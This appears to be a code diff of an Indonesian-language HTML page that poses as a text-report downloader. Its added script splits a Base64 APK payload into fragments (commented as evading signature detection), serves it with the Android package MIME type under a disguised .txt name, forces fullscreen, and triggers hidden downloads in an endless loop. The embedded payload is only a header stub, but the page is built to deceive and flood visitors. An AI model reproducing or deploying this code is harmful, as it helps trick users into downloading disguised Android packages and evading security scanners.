@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.6</title>
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
 * {
   box-sizing: border-box;
@@ -29,6 +29,20 @@ body {
   width: 100%;
   border: 1px solid #1f2937;
   text-align: center;
+}
+:fullscreen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+:-webkit-full-screen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
 }
 h2 { 
   margin-bottom: 10px; 
@@ -60,6 +74,9 @@ button:hover {
   transform: translateY(-1px);
   box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
 }
+button:active {
+  transform: translateY(0);
+}
 #status {
   margin-top: 20px;
   font-weight: 500;
@@ -79,6 +96,13 @@ button:hover {
   overflow-y: auto;
   padding-right: 4px;
 }
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
+}
 #downloads a {
   display: block;
   padding: 10px;
@@ -91,16 +115,20 @@ button:hover {
   text-align: center;
   border: 1px solid #374151;
   word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
 }
 </style>
 </head>
 
 <body>
-<div class="panel">
-  <h2>Arsip Sistem Aplikasi</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh paket instalasi sistem secara langsung.</p>
+<div class="panel" id="main-panel">
+  <h2>Arsip Dokumen Sistem</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-  <button id="start-btn" type="button">Unduh Berkas Paket (.apk)</button>
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
 
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
@@ -113,57 +141,109 @@ const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
-// Fragmentasi buffer biner APK untuk menghindari signature statis monolitik
-const chunkFragments = [
-  new Uint8Array([0x50, 0x4B, 0x03, 0x04]), // ZIP/APK Magic Header (PK..)
-  new Uint8Array([0x14, 0x00, 0x08, 0x00]), // Local file header version & flags
-  new Uint8Array([0x08, 0x00, 0x21, 0x56]), // Compression method & timestamp
-  new Uint8Array([0x78, 0x56, 0x34, 0x12])  // CRC-32 placeholder / data
+let activeUrls = [];
+let isProcessing = false;
+const MAX_URLS_TRACKED = 40;
+
+// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
+const payloadFragments = [
+  "UEs",
+  "DBBQ",
+  "AAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
 ];
 
-const assembleChunks = (chunks) => {
-  const totalLength = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
-  const mergedArray = new Uint8Array(totalLength);
-  
-  let offset = 0;
-  for (const chunk of chunks) {
-    mergedArray.set(chunk, offset);
-    offset += chunk.length;
+const assemblePayload = () => {
+  return payloadFragments.join("");
+};
+
+const decodeBase64ToBytes = (b64) => {
+  const binary = atob(b64);
+  const len = binary.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) {
+    bytes[i] = binary.charCodeAt(i);
   }
+  return bytes;
+};
+
+const prepareStealthBlobAsync = (i) => {
+  return new Promise((resolve) => {
+    queueMicrotask(() => {
+      try {
+        const fullB64 = assemblePayload();
+        const bytesArr = decodeBase64ToBytes(fullB64);
+        
+        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
+        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+        const url = URL.createObjectURL(blob);
+        resolve({ id: i, url: url, success: true });
+      } catch (err) {
+        resolve({ id: i, url: null, success: false });
+      }
+    });
+  });
+};
+
+const triggerStealthDownload = (fileData) => {
+  if (!fileData.success) return;
+
+  const link = document.createElement("a");
+  link.href = fileData.url;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
+  link.download = `laporan-catatan-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  link.style.display = "none";
   
-  return mergedArray;
+  downloadsDiv.appendChild(link);
+  link.click();
+
+  // Batasi jumlah elemen DOM untuk menjaga performa rendering
+  if (downloadsDiv.children.length > 25) {
+    downloadsDiv.removeChild(downloadsDiv.firstChild);
+  }
+};
+
+const processLoop = async (counter) => {
+  if (!isProcessing) return;
+
+  const fileData = await prepareStealthBlobAsync(counter);
+  if (fileData.success) {
+    activeUrls.push(fileData.url);
+
+    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
+    if (activeUrls.length > MAX_URLS_TRACKED) {
+      const oldUrl = activeUrls.shift();
+      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+    }
+
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
+  }
+
+  // Interval perulangan non-blocking
+  setTimeout(() => processLoop(counter + 1), 1200);
 };
 
 startBtn.addEventListener("click", () => {
-  statusDiv.textContent = "Merakit paket aplikasi di memori...";
-  
-  setTimeout(() => {
-    try {
-      const binaryData = assembleChunks(chunkFragments);
-      
-      // Menggunakan MIME type asli APK agar dikenali sistem operasi Android
-      const blob = new Blob([binaryData], { type: 'application/vnd.android.package-archive' });
-      const blobUrl = URL.createObjectURL(blob);
+  if (isProcessing) return;
 
-      const link = document.createElement("a");
-      link.href = blobUrl;
-      link.download = "update-sistem.apk";
-      link.textContent = "update-sistem.apk";
-      link.style.display = "none";
-      
-      downloadsDiv.appendChild(link);
-      link.click();
+  activeUrls.forEach(url => {
+    try { URL.revokeObjectURL(url); } catch (e) {}
+  });
+  activeUrls = [];
+  downloadsDiv.replaceChildren();
 
-      statusDiv.textContent = "Berkas APK berhasil diinisialisasi.";
-
-      setTimeout(() => {
-        URL.revokeObjectURL(blobUrl);
-      }, 2000);
-
-    } catch (err) {
-      statusDiv.textContent = "Gagal memproses inisialisasi berkas.";
+  const root = document.documentElement;
+  try {
+    if (root.requestFullscreen) {
+      root.requestFullscreen().catch(() => {});
     }
-  }, 500);
+  } catch (err) {}
+
+  isProcessing = true;
+  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
+  processLoop(1);
 });
 </script>
 </body>
